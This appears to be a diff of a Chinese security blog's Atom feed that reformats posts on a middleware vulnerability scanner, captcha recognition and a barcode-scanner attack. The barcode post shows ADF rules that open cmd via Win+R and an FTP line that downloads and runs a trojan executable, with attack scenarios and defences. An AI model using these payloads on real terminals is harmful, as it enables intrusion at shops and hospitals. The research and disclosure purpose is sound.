@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.future-sec.com/"/>
-  <updated>2017-07-07T03:32:50.574Z</updated>
+  <updated>2017-07-10T13:45:10.315Z</updated>
   <id>http://www.future-sec.com/</id>
   
   <author>
@@ -17,10 +17,10 @@
   
   <entry>
     <title>中间件漏洞检测框架(F-MiddlewareScan)</title>
-    <link href="http://www.future-sec.com/year/03/16/2016-03-17-MiddlewareScan.html"/>
-    <id>http://www.future-sec.com/year/03/16/2016-03-17-MiddlewareScan.html</id>
+    <link href="http://www.future-sec.com/year/03/16/f-middlewarescan.html"/>
+    <id>http://www.future-sec.com/year/03/16/f-middlewarescan.html</id>
     <published>2016-03-16T16:00:00.000Z</published>
-    <updated>2017-07-07T03:32:50.574Z</updated>
+    <updated>2017-07-10T13:45:10.315Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>实现针对中间件的自动化检测，端口探测-&gt;中间件识别-&gt;漏洞检测-&gt;获取webshell<br>参数说明<br>-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254），最多限制一次可扫描65535个IP。<br>-p 指定要扫描端口列表，多个端口使用,隔开 例如：7001,8080,9999。未指定即使用内置默认端口进行扫描(80,4848,7001,7002,8000,8001,8080,8081,8888,9999,9043,9080)<br>-m 指定线程数量 默认100线程<br>-t 指定HTTP请求超时时间，默认为10秒，端口扫描超时为值的1/2。<br>例子：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python F-MiddlewareScan.py -h <span class="number">10.111</span><span class="number">.1</span></div><div class="line">python F-MiddlewareScan.py -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="number">-192.168</span><span class="number">.2</span><span class="number">.111</span></div><div class="line">python F-MiddlewareScan.py -h <span class="number">10.111</span><span class="number">.1</span><span class="number">.22</span> -p <span class="number">80</span>,<span class="number">7001</span>,<span class="number">8080</span> -m <span class="number">200</span> -t <span class="number">6</span></div></pre></td></tr></table></figure>
@@ -37,7 +37,7 @@
     
     </summary>
     
-      <category term="Python" scheme="http://www.future-sec.com/categories/Python/"/>
+      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="python" scheme="http://www.future-sec.com/tags/python/"/>
@@ -48,10 +48,10 @@
   
   <entry>
     <title>简单验证码识别及工具编写思路</title>
-    <link href="http://www.future-sec.com/year/03/06/2016-03-07-qrcode.html"/>
-    <id>http://www.future-sec.com/year/03/06/2016-03-07-qrcode.html</id>
+    <link href="http://www.future-sec.com/year/03/06/verification_code.html"/>
+    <id>http://www.future-sec.com/year/03/06/verification_code.html</id>
     <published>2016-03-06T16:00:00.000Z</published>
-    <updated>2017-07-07T03:58:57.608Z</updated>
+    <updated>2017-07-10T14:30:55.789Z</updated>
     
     <content type="html"><![CDATA[<p>注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。</p>
 <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码。<br>如：<br><img src="/images/69145828_1.png" alt="img"><br> 还有更糟糕的比如：<br><img src="/images/69145828_2.png" alt="img"><br>   直接就能复制的…这种是完全不知道验证码的意义或者为了应付而做的验证码</p>
@@ -76,7 +76,7 @@
     
     </summary>
     
-      <category term=".net" scheme="http://www.future-sec.com/categories/net/"/>
+      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="python" scheme="http://www.future-sec.com/tags/python/"/>
@@ -87,10 +87,10 @@
   
   <entry>
     <title>一维条形码攻击技术(Badbarcode)</title>
-    <link href="http://www.future-sec.com/year/02/24/2016-02-25-Badbarcode.html"/>
-    <id>http://www.future-sec.com/year/02/24/2016-02-25-Badbarcode.html</id>
+    <link href="http://www.future-sec.com/year/02/24/badbarcode.html"/>
+    <id>http://www.future-sec.com/year/02/24/badbarcode.html</id>
     <published>2016-02-24T16:00:00.000Z</published>
-    <updated>2017-07-07T03:58:46.048Z</updated>
+    <updated>2017-07-10T16:53:19.955Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻<br>击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。</p>
 <h2 id="条形码介绍"><a href="#条形码介绍" class="headerlink" title="条形码介绍"></a>条形码介绍</h2><p><img src="/images/N7NjIvr.png" alt="img"><br>条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。<br>常见的条形码类型有code39 code128 code93 EAN128 EAN13QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类<br>型，一般都利用code128条形码进行攻击。</p>
@@ -99,10 +99,67 @@
 <ol>
 <li>Code128A：标准数字和大写字母，控制符，特殊字符</li>
 <li>Code128B：标准数字和大写字母，小写字母，特殊字符</li>
-<li>Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。<br>Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码<br><img src="/images/mMzyE3v.png" alt="img"><br>如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读<br>为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。<br>起始码对照：<br>128A 11010000100<br>128B 11010010000<br>128C 11010011100<br>结束码都是统一的1100011101011根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。<br><img src="/images/FNN3Qb3.jpg" alt="img"><br><img src="/images/yQnYNj.jpg" alt="img"><br>最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）<br>0x04 控制字符与条形码生成<br>根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。<br><img src="/images/7nyaEr.jpg" alt="img"><br>根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序<br>中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已<br>经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender<br><img src="/images/vQjayqi.jpg" alt="img"><br>下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。<br><img src="/images/jUziauY.jpg" alt="img"><br>然后点击条形码按钮就可以创建自己的条形码，选择code128类型。<br><img src="/images/6zA36nM.jpg" alt="img"><br>利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O<br><img src="/images/reIN3ye.png" alt="img"><br>扫码器扫描后立即弹出对话框<br>市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。<br>0x05 Advanced Data Formatting（高级数据格式）<br>Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。<br>例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。<br>再举个例子：<br>条形码的数据：<br>8523647122<br>通过ADF输出的数据：<br>8523641&amp;lt;Enter&amp;gt;<br>如何实现ADF？<br><img src="/images/QVreYzQ.png" alt="img"><br>现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。<br>ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。<br>利用ADF挟持扫描器数据<br>对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule<br><img src="/images/6V3yEnR.jpg" alt="img"><br>此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。<br>随后依次扫描下列条形码<br><img src="/images/aERbiai.jpg" alt="img"><br><img src="/images/uI3QNz.jpg" alt="img"><br><img src="/images/ZJrYZj7.jpg" alt="img"><br><img src="/images/AVb6Nfa.jpg" alt="img"><br>然后Save Rule<br><img src="/images/JVne6bV.jpg" alt="img"><br>当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。<br>如何恢复？<br><img src="/images/73iq2i6.jpg" alt="img"><br>扫描清除所有规则条形码即可。<h2 id="利用ADF执行命令，种植木马"><a href="#利用ADF执行命令，种植木马" class="headerlink" title="利用ADF执行命令，种植木马"></a>利用ADF执行命令，种植木马</h2>由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。<br>在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”， win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的 sleep()。<br><img src="/images/mMvE3i7.jpg" alt="img"><br>在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。<br>知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：<br><a href="https://twitter.com/tombkeeper/status/663730674017300480" rel="external nofollow noopener noreferrer" target="_blank">https://twitter.com/tombkeeper/status/663730674017300480</a><br>视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。<br><img src="/images/3YNNnaV.png" alt="img"><br>这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器。<br><img src="/images/7VFVrqu.png" alt="img"><br>123scan是摩托罗拉官方出品非常强大的扫描器 管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。<br>打开后点击”Create new configuration file”-&gt;”My scanner is NOT<br>connected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。<br><img src="/images/jM7vaqv.png" alt="img"><br>点击Add action就是添加规则。<br><img src="/images/qyeyUv7.png" alt="img"><br>ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。<br><img src="/images/r67NVj.png" alt="img"><br>设置延时0.5秒，依次添加规则。<br><img src="/images/VjEFRzQ.png" alt="img"><br>最后会自动合并条形码并输出。<br><img src="/images/Jr2aama.png" alt="img"><br>以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中Send<br>ALL that remains是代表设置ADF后扫描条形码的原本数据。<br>以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车<br>-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL that<br>remains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。<br>利用ADF种植木马<br>既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。<br><img src="/images/y6bM7fQ.png" alt="img"><pre><code class="php"><span class="comment">#!bash ftp test?CR?a?CR?a?CR?get w.exe?CR?bye?CR?w.exe?CR?get w.exe?CR?bye?CR?w.exe?CR?</span>
-</code></pre>
-下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。（测试型号Symbol-LS4208-SR20001ZZR）<br><a href="http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2" rel="external nofollow noopener noreferrer" target="_blank">http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2</a><br>密码:wooyun520<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2>简单总结一下可能存在攻击的场景地点:<h3 id="商店付款"><a href="#商店付款" class="headerlink" title="商店付款"></a>商店付款</h3><img src="/images/2ErAzu.png" alt="img"><br>直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。<h3 id="医院病历，检验单"><a href="#医院病历，检验单" class="headerlink" title="医院病历，检验单"></a>医院病历，检验单</h3><img src="/images/nyUzMva.png" alt="img"><br>现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。<br><img src="/images/NjYRRb6.png" alt="img"><h3 id="彩票"><a href="#彩票" class="headerlink" title="彩票"></a>彩票</h3><img src="/images/nyeIFre.png" alt="img"><br>彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。<br><img src="/images/uUneYn2.png" alt="img"><br>4.快递单子<br><img src="/images/FZ7V7zA.png" alt="img"><br>快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。<br><img src="/images/M7fA3em.png" alt="img"><br>。。。。。。<br>场景很多就不一一列举了，以上场景有空我会逐一分析。</li>
+<li>Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。<br>Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码</li>
 </ol>
+<p><img src="/images/mMzyE3v.png" alt="img"></p>
+<p>如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读<br>为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。<br>起始码对照：<br>128A 11010000100<br>128B 11010010000<br>128C 11010011100<br> 结束码都是统一的1100011101011根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。</p>
+<p><img src="/images/FNN3Qb3.jpg" alt="img"></p>
+<p><img src="/images/yQnYNj.jpg" alt="img"></p>
+<p>最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）<br>0x04 控制字符与条形码生成<br>根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。<br><img src="/images/7nyaEr.jpg" alt="img"><br>根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序<br>中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已<br>经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender</p>
+<p><img src="/images/vQjayqi.jpg" alt="img"></p>
+<p>下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。</p>
+<p><img src="/images/jUziauY.jpg" alt="img"></p>
+<p>然后点击条形码按钮就可以创建自己的条形码，选择code128类型。</p>
+<p><img src="/images/6zA36nM.jpg" alt="img"></p>
+<p>利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O</p>
+<p><img src="/images/reIN3ye.png" alt="img"></p>
+<p>扫码器扫描后立即弹出对话框<br>市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。<br>0x05 Advanced Data Formatting（高级数据格式）<br>Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。<br>例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。<br>再举个例子：<br>条形码的数据：<br>8523647122<br>通过ADF输出的数据：<br>8523641&amp;lt;Enter&amp;gt;<br>如何实现ADF？</p>
+<p><img src="/images/QVreYzQ.png" alt="img"></p>
+<p>现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。<br>ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。<br>利用ADF挟持扫描器数据<br>对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule</p>
+<p><img src="/images/6V3yEnR.jpg" alt="img"></p>
+<p>此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。<br>随后依次扫描下列条形码</p>
+<p><img src="/images/aERbiai.jpg" alt="img"></p>
+<p><img src="/images/uI3QNz.jpg" alt="img"></p>
+<p><img src="/images/ZJrYZj7.jpg" alt="img"></p>
+<p><img src="/images/AVb6Nfa.jpg" alt="img"></p>
+<p>然后Save Rule</p>
+<p><img src="/images/JVne6bV.jpg" alt="img"></p>
+<p>当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。<br>如何恢复？</p>
+<p><img src="/images/73iq2i6.jpg" alt="img"></p>
+<p>扫描清除所有规则条形码即可。</p>
+<h2 id="利用ADF执行命令，种植木马"><a href="#利用ADF执行命令，种植木马" class="headerlink" title="利用ADF执行命令，种植木马"></a>利用ADF执行命令，种植木马</h2><p>由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。<br> 在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”， win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的 sleep()。 </p>
+<p><img src="/images/mMvE3i7.jpg" alt="img"></p>
+<p>在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。<br>知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：<br><a href="https://twitter.com/tombkeeper/status/663730674017300480" rel="external nofollow noopener noreferrer" target="_blank">https://twitter.com/tombkeeper/status/663730674017300480</a><br>视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。</p>
+<p><img src="/images/3YNNnaV.png" alt="img"></p>
+<p>这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器。</p>
+<p><img src="/images/7VFVrqu.png" alt="img"></p>
+<p>123scan是摩托罗拉官方出品非常强大的扫描器 管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。<br>打开后点击”Create new configuration file”-&gt;”My scanner is NOT<br>connected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。</p>
+<p><img src="/images/jM7vaqv.png" alt="img"></p>
+<p>点击Add action就是添加规则。</p>
+<p><img src="/images/qyeyUv7.png" alt="img"></p>
+<p>ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。</p>
+<p><img src="/images/r67NVj.png" alt="img"></p>
+<p>设置延时0.5秒，依次添加规则。</p>
+<p><img src="/images/VjEFRzQ.png" alt="img"></p>
+<p>最后会自动合并条形码并输出。</p>
+<p><img src="/images/Jr2aama.png" alt="img"></p>
+<p>以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中Send<br>ALL that remains是代表设置ADF后扫描条形码的原本数据。<br>以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车<br>-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL that<br>remains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。<br>利用ADF种植木马<br>既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。</p>
+<p><img src="/images/y6bM7fQ.png" alt="img"></p>
+<pre><code class="php"><span class="comment">#!bash ftp test?CR?a?CR?a?CR?get w.exe?CR?bye?CR?w.exe?CR?get w.exe?CR?bye?CR?w.exe?CR?</span>
+</code></pre>
+<p>下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。（测试型号Symbol-LS4208-SR20001ZZR）<br><a href="http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2" rel="external nofollow noopener noreferrer" target="_blank">http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2</a><br>密码:wooyun520</p>
+<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>简单总结一下可能存在攻击的场景地点:</p>
+<h3 id="商店付款"><a href="#商店付款" class="headerlink" title="商店付款"></a>商店付款</h3><p><img src="/images/2ErAzu.png" alt="img"></p>
+<p>直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。</p>
+<h3 id="医院病历，检验单"><a href="#医院病历，检验单" class="headerlink" title="医院病历，检验单"></a>医院病历，检验单</h3><p><img src="/images/nyUzMva.png" alt="img"></p>
+<p>现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。</p>
+<p><img src="/images/NjYRRb6.png" alt="img"></p>
+<h3 id="彩票"><a href="#彩票" class="headerlink" title="彩票"></a>彩票</h3><p><img src="/images/nyeIFre.png" alt="img"></p>
+<p>彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。</p>
+<p><img src="/images/uUneYn2.png" alt="img"></p>
+<h3 id="快递单子"><a href="#快递单子" class="headerlink" title="快递单子"></a>快递单子</h3><p><img src="/images/FZ7V7zA.png" alt="img"></p>
+<p>快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。</p>
+<p><img src="/images/M7fA3em.png" alt="img"><br>。。。。。。<br>场景很多就不一一列举了，以上场景有空我会逐一分析。</p>
 <h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol>
 <li>扫码器默认不要开启ADF功能 </li>
 <li>扫描器尽量不要使用键盘模拟 </li>
@@ -118,7 +175,7 @@
     
     </summary>
     
-      <category term="条形码" scheme="http://www.future-sec.com/categories/%E6%9D%A1%E5%BD%A2%E7%A0%81/"/>
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
